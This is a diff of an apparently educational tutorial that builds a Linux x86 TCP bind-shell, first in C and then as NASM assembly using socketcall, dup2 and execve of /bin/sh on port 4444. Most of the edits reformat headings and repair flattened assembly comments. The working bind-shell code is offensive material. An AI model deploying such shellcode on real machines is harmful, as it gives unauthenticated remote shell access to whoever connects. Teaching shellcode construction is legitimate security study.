@@ -85,13 +85,13 @@ int main(void)
   dup2(clientSocket, 0);
   dup2(clientSocket, 1);
   dup2(clientSocket, 2);
-  execve("/bin/bash", NULL, NULL);
+  execve("/bin/sh", NULL, NULL);
 }	
 ```  
 
 Great, now lets dive into the manual pages to find out how all these functions work.
 
-### 1. Create a new Socket - socket()
+### 1. Create a new Socket
 Our first function is `socket()`. We already know that this function is used to create a new socket.   
 To find out more about this function we will use the command `man 7 socket` from our linux terminal.  
 ```console
@@ -113,7 +113,7 @@ Our C socket function will be:
 int ipv4Socket = socket(AF_INET, SOCK_STREAM, 0);
 ```
 
-### 2. Create a TCP-IP Address for the Socket - struct sockaddr\_in
+### 2. Create a TCP-IP Address for the Socket
 Now that our IPv4, TCP socket has been created, we will need to create an address for it. After creating the TCP-IP address, we will bind the address to the socket.  
 To create the TCP-IP address (TCP Port Number & IP Address), we will dig into the `ip` man pages with command `man 7 ip`.   
 We find this relevant information:
@@ -140,7 +140,7 @@ struct sockaddr_in ipSocketAddr = { .sin_family = AF_INET, .sin_port = htons(444
 + `man htons` - The `htons()` function converts an unsigned short integer hostshort from host byte order to network byte order.
 + `man htonl` - The `htonl()` function converts the unsigned integer hostlong from host byte order to network byte order.
 
-### Bind the TCP-IP Address to the Socket - bind()
+### 3. Bind the TCP-IP Address to the Socket
 Now that we have a socket, a TCP port, and an IPv4 interface, we need to bind them all together.  
 we will use the `bind()` C function to accomplish this, and dive into the man pages to discover the arguements we will need with the command `man 2 bind`.  
 ```c
@@ -154,7 +154,7 @@ Our bind function will be:
 bind(ipv4Socket, (struct sockaddr\*) &ipSocketAddr, sizeof(ipSocketAddr));
 ```
 
-### 4. Listen for incoming connections on the TCP-IP Socket - listen()
+### 4. Listen for incoming connections on the TCP-IP Socket
 Now that we have bound an address to our socket, we will need to configure it to be in the listening state. Allowing the socket to listen for incoming connections.   
 To learn what we need to do we consult the manual page with `man 2 listen`.   
 We find that the `listen()` function requires two arguments.  
@@ -163,24 +163,26 @@ int listen(int sockfd, int backlog);
 ```
 + `sockfd`  - Simply our `ipv4Socket` variable. 
 + `backlog` - This is for handling multiple connections. 
-  - We only need to handle one connection at a time, therefor we will set this value to `0`.   
+  - We only need to handle one connection at a time, therefor we will set this value to `0`. 
+
 Our C function will be:   
 ```c
 listen(ipv4Socket, 0);
 ```
 
-### 5. Accept the incoming connections, on the TCP-IP Socket, and create a new connected session - accept()
+### 5. Accept the incoming connections and create a new connected session
 Now that our socket is listening we need to accept the incoming connections with the C function `accept()`.  
 Consulting the manual page with `man 2 accept` we find that:  
 + the accept function takes the connection request from the listen function and creates a new connected socket.
 + `int accept(int sockfd, struct sockaddr \*addr, socklen_t \*addrlen);`
-We will give our `accept()` function the variable name `clientSocket`. We will use our `ipv4Socket` variable we created earlier to fulfill the `int sockfd` arguments, and set the remaining two arguments to `NULL`.  
+We will give our `accept()` function the variable name `clientSocket`. We will use our `ipv4Socket` variable we created earlier to fulfill the `int sockfd` arguments, and set the remaining two arguments to `NULL`.   
+
 Our C function will be:   
 ```c
 int clientSocket = accept(ipv4Socket, NULL, NULL);
 ```
 
-### 6. Transfer Standard-Input, Standard-Output, and Standard-Error to the connected session - dup2()
+### 6. Transfer STDIN, STDOUT, STDER to the connected session
 Now that we have a tcp socket listening and accepting incoming connections, we will need to pass the input, output, and error messages from the program, to the connecting client. This will allow the connecting client to input text using their keyboard, and read the output that is returned.  
 We will duplicate the File Descriptors for Standard Input(0), Standard Output(1), and Stadard Error(2) to the newly created, connected socket using the dup2() function three times. We will consult the man pages for more information will `man 2 dup2`.   
 ```c
@@ -194,7 +196,7 @@ dup2(clientSocket, 1);
 dup2(clientSocket, 2);
 ```
 
-### 7. Spawn a "/bin/sh" shell for the client, in the connected session. - execve()
+### 7. Spawn a "/bin/sh" shell in the connected session
 At this point we have our program listening, and accepting connections from incoming clients. Once the client connects, the input and output of our program is passed over to the connecting client. The last thing we need to do is execute a program for our client to interact with.  
 We will use the C function `execve()` to execute the shell `/bin/bash`.  
 Consulting the manual pages with `man 2 execve` we find:  
@@ -232,7 +234,7 @@ At the time of the interrupt, the value stored in the EAX register determines wh
 From above, we see the 5 C funtions we need, all use the same system call `socketcall 102`.  
 Therefor for these functions, EAX will hold the value 102 (0x66 in Hex) for all of them.  
 
-The system call `socketcall` will know what to do (_create a socket, listen, accept incoming connection, etc_), 
+The system call `socketcall` will know what to do (create a socket, listen, accept incoming connection, etc), 
 based on the value stored in the EBX register.   
 The arguments of the C level function will be pushed onto the stack, and the ECX register will point to the top of the stack.  
 + Stack Memory grows from high memory to low memory.
@@ -294,15 +296,15 @@ xchg esi, eax     ; After the SYSCAL, sockfd is stored in the EAX Register.
                   ;   Move it to the ESI Register; we will need it later.
 ```
 
-### 2+3. Create a TCP-IP Address for the Socket + Bind the TCP-IP Address to the Socket.  
+### 2+3. Create a TCP-IP Address and Bind it to the Socket
 Default C Function:
 ```c
 int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
 ```
 Our C Function:	 
 ```c   
-    bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));  
-    EBX    ECX[0]                   ECX[1]                  ECX[2]
+<socketcall>   bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));                                                            
+  EAX=0x66     EBX    ECX[0]                   ECX[1]                  ECX[2]      
 ```   
 + `EAX = 102 = 0x66`
   - This is the value to call the SYSCAL `socketcall`.
@@ -317,8 +319,9 @@ Our C Function:
   - The Binary Length of the Struct we will store in ECX[1]. 
  
 This System Call is tricky because we will need to have an array within an array.  
-  ECX[1] will point to the start of an array of 3 variables.   
-   We will push these 3 variables onto the stack first, then we will push ECX[2], ECX[1], and finally ECX[0].  
++ `ECX[1]` will point to the start of the array of 3 variables on the Stack.  
++ We will push these 3 variables onto the stack first, then we will push `ECX[2]`, `ECX[1]`, and finally `ECX[0]`.  
+
  This is the struct we used in C to store the IP-Socket Address values used for the bind() function call:  
 
 ```c
@@ -332,19 +335,19 @@ struct sockaddr_in ipSocketAddr = { .sin_family = AF_INET, .sin_port = htons(444
   - All this means is `4444` in reverse, in Hex (`0x115C`).
   - Everything pushed onto the Stack needs to be in reverse.  
 + `ARG[2] = INADDR_ANY = 0x00000000`
-  - All Network Interfaces		
+  - All Network Interfaces
   - Find value for `INADDR_ANY`: 
 ```console
  cat /usr/src/linux-headers-$(uname -r)/include/uapi/linux/in.h | grep INADDR_ANY  
    #define INADDR_ANY ((unsigned long int) 0x00000000)
 ```  
  The order to push all this on the stack will be:   
-1. `ARG[2]`
-2. `ARG[1]`
-3. `ARG[0]`
-4. `ECX[2]`
-5. `ECX[1]`
-6. `ECX[0]`
+1. `ARG[2]`  
+2. `ARG[1]`  
+3. `ARG[0]`  
+4. `ECX[2]`  
+5. `ECX[1]`  
+6. `ECX[0]`  
 
 ```nasm
 xor eax, eax      ; This sets the EAX Register to NULL (all zeros).
@@ -371,8 +374,8 @@ int listen(int sockfd, int backlog);
 ```
 Our C Function:	   
 ```c
-listen( ipv4Socket, 0 );  
-EBX      ECX[0]   ECX[1]  
+<socketcall>   listen( ipv4Socket, 0 );
+  EAX=0x66      EBX      ECX[0]   ECX[1]
 ```  
 + `EAX    = 102 = 0x66`
   - This is the value to call the SYSCAL `socketcall`.   
@@ -403,8 +406,8 @@ int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
 ```
 #### Our C Function        
 ```c
-int clientSocket = accept( ipv4Socket, NULL, NULL );
-                    EBX     ECX[0]    ECX[1] ECX[2]
+<socketcall>   clientSocket = accept( ipv4Socket, NULL, NULL );
+EAX=0x66                       EBX     ECX[0]    ECX[1] ECX[2]
 ```
 + `EAX    = 102  = 0x66`
   - This is the value to call the SYSCAL `socketcall`.  
@@ -473,13 +476,14 @@ int execve(const char *filename, char *const argv[], char *const envp[]);
 ```  
 #### Our C Function
 ```c
-execve("/bin/bash", NULL, NULL);
+; execve("/bin//sh", NULL, NULL);
+;  EAX      EBX       ECX   EDX
 ```
-Execve SysCall: In the newly created socket, execute a shell. - See "man 2 execve" for full details.  
-`int execve(const char *filename, char *const argv[], char *const envp[]);`  
-
-Values in C program : execve("/bin/bash", NULL, NULL);  
-
+The Execve SysCall is used to execute programs on the linux system. In our case, we will execute a shell in the connected socket.  
+We will turn to the man pages with command `man 2 execve` to learn more about `execve()`. 
+```c
+int execve(const char *filename, char *const argv[], char *const envp[]);
+```
 + `EAX = int execve() = 11`
   - System Call Number for `execve`  
 ```console
@@ -518,7 +522,7 @@ global _start
 section .text
 
 _start:
-; 1. Create Socket
+; 1. Create a new Socket
 ;<socketcall>  ipv4Socket = socket( AF_INET, SOCK_STREAM, 0 );
 ;  EAX=0x66                  EBX     ECX[0]   ECX[1]    ECX[2]
 xor eax, eax      ; This sets the EAX Register to NULL (all zeros).
@@ -538,7 +542,7 @@ int 0x80          ; System Call Interrupt 0x80 - Executes socket().
 xchg esi, eax     ; After the SYSCAL, sockfd is stored in the EAX Register. 
                   ;   Move it to the ESI Register; we will need it later.
 
-; 2. Create TCP-IP Address and Bind the Address to the Socket
+; 2+3. Create TCP-IP Address and Bind the Address to the Socket
 ; struct sockaddr_in ipSocketAddr = { .sin_family = AF_INET, .sin_port = htons(4444), .sin_addr.s_addr = INADDR_ANY };
 ;                                              ARG[0]               ARG[1]                          ARG[2]
 ;<socketcall>   bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));  
@@ -559,7 +563,7 @@ push esi          ; ECX[0]. This is the value we saved from creating the Socket 
 mov ecx, esp      ; Now all that is left is to point ECX to the top of the loaded stack and let it do it's thing.
 int 0x80          ; System Call Interrupt 0x80 - Executes bind(). Connecting our Socket to the TCP-IP Address.
 
-; 3. Listen for incoming connections on TCP-IP Socket.
+; 4. Listen for incoming connections on TCP-IP Socket.
 ; <socketcall>   listen( ipv4Socket, 0 );  
 ;  EAX=0x66       EBX      ECX[0]   ECX[1]  
 xor eax, eax     ; This sets the EAX Register to NULL (all zeros).
@@ -572,26 +576,29 @@ push esi         ; ECX[0]. This is the value we saved from creating the Socket e
 mov ecx, esp     ; Point ECX to the top of the stack. 
 int 0x80         ; Executes listen(). Allowing us to handle incoming TCP-IP Connections.
 
-; 4. Accept incoming connection on Socket and create a new, connected socket for client.
-; <socketcall>   clientSocket = accept( ipv4Socket, NULL, NULL ); ;   EAX=0x66
-EBX     ECX[0]    ECX[1] ECX[2] xor eax, eax     ; This sets the EAX Register
-to NULL (all zeros).  mov al, 0x66     ; EAX is now 0x00000066 = SYSCALL 102 -
-socketcall xor ebx, ebx     ; This sets the EBX Register to NULL (all zeros).
-mov bl, 0x5      ; EBX is set to accept().  xor ecx, ecx     ; This sets the
-ECX Register to NULL (all zeros).  push ecx         ; ECX[2]. Push the value
-0x0 to the stack.  push ecx         ; ECX[1]. Push the value 0x0 to the stack.
-push esi         ; ECX[0]. This is the value we saved from creating the Socket
-earlier.  mov ecx, esp     ; Point ECX to the top of the stack.  int 0x80
-; System Call Interrupt 0x80 - Executes accept(). Allowing us to create
-connected Sockets.  xchg ebx, eax    ; The created clientSocket is stored in
-EAX after receiving a successful connection.
+; 5. Accept the incoming connections, on the TCP-IP Socket, and create a new connected session.
+; <socketcall>   clientSocket = accept( ipv4Socket, NULL, NULL ); 
+;EAX=0x66                        EBX     ECX[0]    ECX[1] ECX[2] 
+xor eax, eax     ; This sets the EAX Register to NULL (all zeros).
+mov al, 0x66     ; EAX is now 0x00000066 = SYSCALL 102 - socketcall 
+xor ebx, ebx     ; This sets the EBX Register to NULL (all zeros).
+mov bl, 0x5      ; EBX is set to accept().
+xor ecx, ecx     ; This sets the ECX Register to NULL (all zeros).
+push ecx         ; ECX[2]. Push the value 0x0 to the stack.
+push ecx         ; ECX[1]. Push the value 0x0 to the stack.
+push esi         ; ECX[0]. This is the value we saved from creating the Socket earlier.
+mov ecx, esp     ; Point ECX to the top of the stack.
+int 0x80         ; System Call Interrupt 0x80 - Executes accept(). Allowing us to create connected Sockets.
+xchg ebx, eax    ; The created clientSocket is stored in EAX after receiving a successful connection.
 
-; 5. Duplicate STDIN, STDOUT, STDERR to the connected Socket.  ;  dup2(
-clientSocket, 0 ); // STDIN ;  dup2( clientSocket, 1 ); // STDOUT ;  dup2(
-clientSocket, 2 ); // STDERR ;  EAX       EBX      ECX     xor eax, eax   ;
-This sets the EAX Register to NULL (all zeros).  xor ecx, ecx   ; This sets the
-ECX Register to NULL (all zeros).  mov cl, 0x2    ; This sets the loop counter,
-and 
+; 5. Transfer STDIN, STDOUT, STDERR to the connected Socket.
+; dup2( clientSocket, 0 ); // STDIN 
+; dup2( clientSocket, 1 ); // STDOUT
+; dup2( clientSocket, 2 ); // STDERR
+; EAX       EBX      ECX
+xor eax, eax   ; This sets the EAX Register to NULL (all zeros).
+xor ecx, ecx   ; This sets the ECX Register to NULL (all zeros).
+mov cl, 0x2    ; This sets the loop counter, and
                ;  will also be the value of "int newfd" for the 3 dup2 SYSCAL's.
 dup2Loop:      ; Procedure label for the dup2 Loop.
 mov al, 0x3f   ; EAX is now 0x0000003F = SYSCALL 63 - dup2
@@ -600,7 +607,7 @@ int 0x80       ; System Call Interrupt 0x80 - Executes accept().
 dec ecx        ; Decrements ECX by 1 
 jns dup2Loop   ; Jump back to the dup2Loop Procedure until ECX equals 0.
 
-; 6. Spawn a sh shell for the client in the connected Socket.
+; 7. Spawn a "/bin/sh" shell for the client, in the connected session. 
 ; execve("/bin//sh", NULL, NULL);
 ;  EAX      EBX       ECX   EDX
 push edx         ; Push NULL onto the stack because the string needs to be NULL Terminated.
